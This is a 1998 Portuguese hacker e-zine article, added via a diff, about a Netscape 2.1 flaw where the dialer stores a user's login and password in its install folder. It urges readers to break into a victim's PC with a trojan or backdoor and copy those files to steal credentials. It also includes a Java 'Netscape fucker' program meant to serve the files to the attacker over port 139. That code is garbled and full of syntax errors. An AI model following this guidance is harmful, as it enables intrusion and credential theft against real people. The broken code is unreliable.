@@ -1,0 +1,231 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+
+                                23 NETSCAPE 23
+
+                                     BY
+
+                               KILLER_TOY & Draco
+
+
+                ▒▒▒▒█▒           ████ █████
+                ▒█▒█▒▒ █ █   █   █    █▒▒▒█   
+                ▒██▒▒▒ █ █   █   ███  ████
+                ▒█▒█▒▒ █ █   █   █    █ █
+                ▒█▒▒█▒ █ ███ ███ ████ █  █
+
+                        ████████
+                        █▒▒▒▒▒▒█      ▒█  █▒
+                          █▒▒█  ▒▒▒▒▒▒ ▒██▒
+                          █▒▒█  ▒██▒█▒  ▒▒
+                          █▒▒█  ▒▒▒▒▒▒  ▒▒
+                          ████
+                                - Production -
+                                   Presents
+
+           Texto compilado by: <<Kille®*toÿ>>
+           Copyright and All Rights Reserved-1998
+
+ 
+        <<|-- O Grave Bug do Netscape 2.1 e do Personal Edition --|>>
+
+        Vcs devem estar me perguntando o que é isso!
+        Vou explicar , tanto a Netscape Corporation como a Microsoft cometem
+        erros incriveis , como ainda vou explicar.
+        Na verdade ninguém usa mais o Netscape 2.1,mas há quem use (só se for
+        uma anta)
+        E vc pode se aproveitar disso pra faturar umas senhas novas!! é isso
+        mesmo senhas novinhas!!!
+        Eles cometeram um bug tão feio mais tão feio , que além dele te dar a
+        senha e login na cara ele te da todos os dados do úsuario. Legal não?
+                             
+                         <<|-- Os Burraudos --|>>
+
+           A Netscape não soube contratar profissionais capazes de desenvolver
+           um browser seguro para seus usuários , e nem a menos se preucuparão
+           em resolve-lo.
+           Isso pra vermos que nunca estamos seguros na Internet,
+           principalmnete quem usa o Netscape, até o Netscape 4.03 apresentou
+           Bugs!
+           Não confie no Netscape , seja qual seja a versão , nunca confie.
+           Mas vamos ao que interessa mesmo.
+                                                        
+                          <<|-- O Bug --|>>
+
+           Primeiramente não estou dizendo pra ninguém seguir estes passos ,
+           a não seja que vc esteja certo do que vai fazer, não tenho nada a
+           ver com isso!
+           Aki é seguinte ,no final da instalação do N2.1 vc é obrigado a
+           colocar seus dados completos como, None,endereco,empresa e tal...
+           Mas vc ainda é obrigado a colocar sua senha e login de conexão e
+           seu e-mail. Isso porque esse netscape tem seu próprio programa
+           DIALER ( discagem ) então pensem comigo! Se eu colocar os dados e
+           der um Enter esse dados serão gravados em algum arquivo , mas qual?
+           é ai que vem o bug!
+
+C:\NETSCAPE -> Esse é o diretório do Netscape 2.1
+C:\NETSCAPE\DIALER -> Esse é o diretório onde fica o programa DIALER.
+C:\NETSCAPE\DIALER\SIGNUP.EXE Este é o programa onde vc coloca sua senha e login
+                              Pra discar para o provedor.
+
+           Simples não!!
+           Mas o que tem a ver isso ai?
+           Quem for uma anta abelhuda não vai entender mesmo, vou explicar.
+           quando vc executar SIGNUP.EXE ele entra na tela de dados ,ou seja
+           onde vc coloca seus dados , depois quando vc concluir todo os
+           cadastro , ele grava isso tudo em um arquivo dentro do diretório
+           onde ele se encontra que no nosso caso é o C:\NETSCAPE\DIALER
+
+           O que fazer?
+           Simples , vcs podem invadir o computador da vítima de qualquer
+           jeito dai vc se vira , depois entra no diretório
+           C:\NETSCAPE\DIALER e copia ele todo principalmente o SIGNUP.EXE
+           para o seu computador em um diretório sozinho. Depois é só executar
+           SIGNUP.EXE  e ir passando a tela com todos os dados e o principal
+           Senha e login! 
+           Depois é só fazer a festa!!
+           Faça um trojan em Batch ,C,clipper o que vc quiser e tente!!!
+           Alguém ainda tem que ter esse lixo de browser.
+
+           Qualquer coisa me mandem um e-mail  (pode ser até bomba )
+           E-mail: acekiller@starmedia.com
+
+           Colaboraçao: E-Zine Fw by Draco
+
+           Minha parte pelo que o KILLER me disse eu fiz um progzinho em
+           JAVA que pega estes arquivos divirtam-se.......
+
+           O programa funciona da seguinte forma, vc tem que abrir o pc
+           do cara tem que dar um httpon nele, usa um backdoor se vira,
+           quando o cara tiver ativado, 'e so colocar o ip dele que o prog
+           vai la e pega o arquivo das senhas pra vc.....
+
+           NETSCAPE-------------------------------------------CORTA
+
+/**
+/FODEADOR DE NETSCAPE
+/VERSAO 1.0
+/ESCRITO POR Draco
+/HAPY HACKING
+**/
+
+import java.net.*;
+import java.io.*;
+import java.util.*;
+
+class WWWutil {
+
+final static String version = "1.0";
+final static String mime_app_exe = "application/executable";
+
+final static String CRLF = "\r\n";
+
+public static byte tobytes (String s){}{
+byte b {} = new byte {s.length()};
+s.getBytes (0,b.length,b,0);
+return b;
+}
+
+class HTTPlog {
+
+public static void error (String entrada) {
+System.out.println (ERRO:"+entrada);
+}      public static void request (String solicit) {
+System.out.println (solicit);
+}}
+
+
+class NETSCAPE {
+
+public static final int porta = 139
+final static string docRaiz = "c:\Arquivo de Programas\netscape\dialer";
+final static string arqindex = "signup.exe"
+final static string int tam_buffer - 2048;
+final stati int RT_GET = 1;
+final static int RT_UNSUP = 2;
+final static int RT_END = 4;
+
+private static void handleUnsup (String solicit,
+OutputStream out) {
+HTTPlog.error ("ERROR: "+solicit);}
+
+private static void handleget (String solicit,
+OutputStream out){
+
+int fsp = solicit.indexOf ('');
+int nsp = solicit.indexOf ('', fsp +1);
+String nomearq = solicit.substring (fsp + 1, nsp);
+nomearq = docRaiz + nomearq + (nomearq.endsWith
+
+("\"? arqindex: "");
+
+try {
+
+file f = new file (nomearq);
+if (! f.exists ()){
+out.write (WWWutil.error (404, "ERROR", nomearq));
+
+return;
+
+}
+
+if (! f.canRead ()){
+
+out.write (WWWutil.error (404, ERROR", nomearq));
+
+return;
+}
+
+InputStream input = new FileInputSream (f);
+
+String mime_header = WWWutil.mimetypeSTring
+(nomearq);
+int n = input.avaiable ();
+out.write (WWWutil.mimeHeader (mime_header,
+n));
+byte buf {} = new byte {tam_buffer};
+while ((n = input.read (buf)) >= 0 ){
+out.write (buf,0,n);
+}
+
+input.close ();
+}
+catch (IO.Exception e ){
+HTTPlog.error ( Excecao: "+e);
+}}
+
+public static void main (String args  [] ) trows
+
+Exception {
+
+ServerSocket acceptSocket = new ServerSocket (porta);
+while (true) {
+
+String solicit;
+
+Socket s = acceptSocket.accept ();
+OutputStream = acceptSocket.accept();
+OutputStream saida = s.getOutputStream ();
+InputStream entrada = s.getInputStream ();
+if ((request = getRawRequest (entrada))!= null){
+switch (HTTPRequestType (solicit)) {
+case RT_GET:
+handleGet (solicit, saida);
+break;
+case RT_UNSUP;
+default:
+handleUnsup (solicit, saida);
+break;
+}
+HTTPLog,Request (solicit );
+}
+
+entrada.close();
+saida.close ();
+s.close ();
+}}}
+
+           NETSCAPE-------------------------------------------CORTA
+
+           1998 FW - Corporation
+           
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
